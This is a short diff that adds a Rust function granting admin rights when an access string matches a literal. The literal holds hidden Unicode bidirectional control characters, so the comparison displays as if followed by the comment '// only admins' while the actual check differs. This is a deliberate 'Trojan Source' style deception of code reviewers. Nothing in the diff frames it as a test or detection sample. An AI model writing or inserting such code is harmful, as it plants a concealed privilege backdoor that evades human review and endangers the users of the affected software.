@@ -1,0 +1,5 @@
+fn check(access: &str) {
+    if access == "user‮ ⁦// only admins⁩⁦" {
+        grant_admin();
+    }
+}
